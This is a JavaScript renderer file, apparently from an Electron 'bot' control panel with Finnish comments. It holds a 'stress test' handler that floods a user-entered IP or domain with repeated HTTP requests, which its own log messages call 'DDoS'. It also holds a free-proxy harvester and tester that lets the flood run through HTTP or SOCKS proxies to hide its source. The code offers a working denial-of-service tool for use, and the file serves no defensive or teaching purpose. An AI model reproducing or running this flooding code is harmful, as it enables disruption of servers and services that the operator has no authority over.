const { ipcRenderer } = require('electron');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

console.log('Render.js toimii!');

// Elementit
const status = document.getElementById('status');
const appLog = document.getElementById('app-log');
const dataLog = document.getElementById('data-log');
const clearSystemBtn = document.getElementById('clear-system');
const clearUserBtn = document.getElementById('clear-user');
const stressBtn = document.getElementById('stress-btn');
const stressIp = document.getElementById('stress-ip');
const stressCount = document.getElementById('stress-count');
const stressInterval = document.getElementById('stress-interval');
const stressDuration = document.getElementById('stress-duration');
const stressProxy = document.getElementById('proxy-ip');
const connectProxyBtn = document.getElementById('connect-proxy');
const proxyIpInput = document.getElementById('proxy-ip');
const memo = document.getElementById('memo');
const saveMemoBtn = document.getElementById('save-memo');

// Free Proxies -sivun elementit
const proxySearchBtn = document.getElementById('proxy-search-btn');
const proxyLog = document.getElementById('proxy-log');
const proxyListBody = document.getElementById('proxy-list-body');
const proxyWorkingBox = document.getElementById('proxy-working-box');
const clearProxyLogBtn = document.getElementById('clear-proxy-log');
const stopProxySearchBtn = document.getElementById('stop-proxy-search');
const proxyAmountInput = document.getElementById('proxy-amount-input');

// Clear log -nappi Free Proxies -sivulle
if (clearProxyLogBtn) {
  clearProxyLogBtn.onclick = () => {
    proxyLog.innerHTML = '';
  };
}

// Stop search -nappi
let proxySearchAbort = false;
if (stopProxySearchBtn) {
  stopProxySearchBtn.onclick = () => {
    proxySearchAbort = true;
    proxyLog.innerHTML += `<div style="color:#f00;">Proxy search stopped by user.</div>`;
  };
}

// Taustavärin oletus musta
document.body.style.background = '#212121';

// Taustavärin vaihtonapit vain panelsivulle alareunaan
const bgBlackBtn = document.getElementById('bg-black');
const bgBlueBtn = document.getElementById('bg-blue');
const bgTurquoiseBtn = document.getElementById('bg-turquoise');
const bgWhiteBtn = document.getElementById('bg-white');
const bgButtons = document.getElementById('bg-buttons');
if (bgButtons) {
  bgButtons.style.display = 'block';
}
if (bgBlackBtn) bgBlackBtn.onclick = () => { document.body.style.background = '#212121'; };
if (bgBlueBtn) bgBlueBtn.onclick = () => { document.body.style.background = '#1976d2'; };
if (bgTurquoiseBtn) bgTurquoiseBtn.onclick = () => { document.body.style.background = '#00bcd4'; };
if (bgWhiteBtn) bgWhiteBtn.onclick = () => { document.body.style.background = '#fff'; };

// Botin käynnistys, sammutus, restart
if (status && appLog && dataLog && clearSystemBtn && clearUserBtn && stressBtn && stressIp &&
    stressCount && stressInterval && stressDuration && stressProxy && connectProxyBtn &&
    proxyIpInput && memo && saveMemoBtn) {

  document.getElementById('start').onclick = () => {
    status.textContent = 'On';
    appLog.innerHTML += '<div>started</div>';
    ipcRenderer.send('start-bot');
  };
  document.getElementById('restart').onclick = () => {
    status.textContent = 'On';
    appLog.innerHTML += '<div>restarted</div>';
    ipcRenderer.send('stop-bot');
    ipcRenderer.send('start-bot');
  };
  document.getElementById('stop').onclick = () => {
    status.textContent = 'turned off';
    appLog.innerHTML += '<div>turned off</div>';
    ipcRenderer.send('stop-bot');
  };

  clearSystemBtn.onclick = () => {
    appLog.innerHTML = '';
  };
  clearUserBtn.onclick = () => {
    dataLog.innerHTML = '';
  };

  ipcRenderer.on('ip-log', (event, data) => {
    dataLog.innerHTML += `<div>${data}</div>`;
  });

  connectProxyBtn.onclick = async () => {
    const proxyValue = proxyIpInput.value.trim();
    window.selectedProxy = proxyValue;
    if (!proxyValue) {
      appLog.innerHTML += `<div>Set proxy ip!</div>`;
      return;
    }
    appLog.innerHTML += `<div>connecting to proxy ${proxyValue}...</div>`;
    try {
      let result = await window.testProxy(proxyValue);
      if (!result.success) result = await window.testProxy('http://' + proxyValue);
      if (!result.success) result = await window.testProxy('https://' + proxyValue);
      if (!result.success) result = await window.testProxy('socks5://' + proxyValue);
      if (!result.success) result = await window.testProxy('socks4://' + proxyValue);
      if (result.success) {
        appLog.innerHTML += `<div>Proxy works! Outer IP: ${result.ip}</div>`;
      } else {
        appLog.innerHTML += `<div>Proxy does not work!</div>`;
      }
    } catch (e) {
      appLog.innerHTML += `<div>Error testing proxy!</div>`;
    }
  };

  stressBtn.onclick = () => {
    const target = stressIp.value.trim();
    const count = parseInt(stressCount.value) || 1;
    const interval = parseInt(stressInterval.value) || 500;
    const duration = parseInt(stressDuration.value) || 2000;
    const proxy = stressProxy.value.trim();

    if (!target) {
      appLog.innerHTML += `<div>DDoS failed: IP/domain missing</div>`;
      return;
    }

    let agent = undefined;
    if (proxy) {
      if (proxy.startsWith("http://") || proxy.startsWith("https://")) {
        agent = new HttpsProxyAgent(proxy);
      } else if (proxy.startsWith("socks4://") || proxy.startsWith("socks5://")) {
        agent = new SocksProxyAgent(proxy);
      }
    }

    let sent = 0;
    const startTime = Date.now();
    const timer = setInterval(() => {
      if (sent >= count || Date.now() - startTime > duration) {
        clearInterval(timer);
        appLog.innerHTML += `<div>Stress test complete (${sent} requests)</div>`;
        return;
      }
      fetch(`http://${target}`, agent ? { agent } : {})
        .then(() => {
          appLog.innerHTML += `<div>DDoS sent to ${target} (${sent+1}/${count})${proxy ? ' PROXY' : ''}</div>`;
        })
        .catch(() => {
          appLog.innerHTML += `<div>DDoS failed to ${target} (${sent+1}/${count})${proxy ? ' PROXY' : ''}</div>`;
        });
      sent++;
    }, interval);
  };

  memo.value = localStorage.getItem('memo') || '';
  saveMemoBtn.onclick = () => {
    localStorage.setItem('memo', memo.value);
  };
}

// Proxy testausfunktio (HTTP/HTTPS/SOCKS)
window.testProxy = async (proxyUrl) => {
  try {
    let agent;
    if (proxyUrl.startsWith("http://") || proxyUrl.startsWith("https://")) {
      agent = new HttpsProxyAgent(proxyUrl);
    } else if (proxyUrl.startsWith("socks4://") || proxyUrl.startsWith("socks5://")) {
      agent = new SocksProxyAgent(proxyUrl);
    } else {
      throw new Error("Tuntematon proxyn protokolla: " + proxyUrl);
    }
    const res = await require('node-fetch')('https://api.ipify.org?format=json', { agent, timeout: 10000 });
    if (!res.ok) return { success: false };
    const data = await res.json();
    return { success: true, ip: data.ip };
  } catch {
    return { success: false };
  }
};

// Proxylistan haku IPC:llä main-prosessista
if (proxySearchBtn && proxyLog && proxyListBody && proxyWorkingBox && proxyAmountInput) {
  proxySearchBtn.onclick = () => {
    proxyLog.innerHTML = '<div>Updating proxy list...</div>';
    proxyListBody.innerHTML = '';
    proxyWorkingBox.innerHTML = '<b>Working proxies:</b><br>';
    proxySearchAbort = false;
    const amount = parseInt(proxyAmountInput.value) || 50;
    ipcRenderer.send('fetch-proxy-list', amount);
  };

  ipcRenderer.on('proxy-list-data', async (event, proxies) => {
    let amount = parseInt(proxyAmountInput.value) || 50;
    proxyLog.innerHTML += `<div>Found ${proxies.length} proxies. Testing...</div>`;
    let workingProxies = [];
    let rowCount = 0;
    for (const proxy of proxies.slice(0, amount)) {
      if (proxySearchAbort) break;
      const [ip, port] = proxy.split(':');
      proxyLog.innerHTML += `<div>Testing ${ip}:${port}...</div>`;
      let result = await window.testProxy('http://' + proxy);
      if (!result.success) result = await window.testProxy('https://' + proxy);
      if (!result.success) result = await window.testProxy('socks5://' + proxy);
      if (!result.success) result = await window.testProxy('socks4://' + proxy);
      const statusText = result.success ? `<span class="proxy-status-ok">WORKS</span>` : `<span class="proxy-status-fail">FAILED</span>`;
      const row = document.createElement('tr');
      row.innerHTML = `
        <td>${ip}</td>
        <td>${port}</td>
        <td>${statusText}</td>
        <td><button class="proxy-connect-btn" data-ip="${ip}" data-port="${port}">Connect</button></td>
      `;
      if (result.success) {
        workingProxies.unshift(row); // Lisää kärkeen
        proxyWorkingBox.innerHTML += `${ip}:${port}<br>`;
        proxyLog.innerHTML += `<div style="color:#0f0;">${ip}:${port} toimii!</div>`;
      } else {
        proxyListBody.appendChild(row);
      }
      rowCount++;
    }
    // Lisää toimivat kärkeen
    for (const row of workingProxies) {
      proxyListBody.insertBefore(row, proxyListBody.firstChild);
    }
    proxyLog.innerHTML += `<div>Tested ${rowCount} proxies.</div>`;
    document.querySelectorAll('.proxy-connect-btn').forEach(btn => {
      btn.onclick = async () => {
        const ip = btn.getAttribute('data-ip');
        const port = btn.getAttribute('data-port');
        const proxyAddr = `${ip}:${port}`;
        proxyLog.innerHTML += `<div>Connecting to ${proxyAddr}...</div>`;
        let result = await window.testProxy('http://' + proxyAddr);
        if (!result.success) result = await window.testProxy('https://' + proxyAddr);
        if (!result.success) result = await window.testProxy('socks5://' + proxyAddr);
        if (!result.success) result = await window.testProxy('socks4://' + proxyAddr);
        if (result.success) {
          proxyLog.innerHTML += `<div style="color:#0f0;">Connected to ${proxyAddr}! External IP: ${result.ip}</div>`;
        } else {
          proxyLog.innerHTML += `<div style="color:#f00;">Connection to ${proxyAddr} failed!</div>`;
        }
        proxyLog.scrollTop = proxyLog.scrollHeight;
      };
    });
    proxyLog.scrollTop = proxyLog.scrollHeight;
  });
}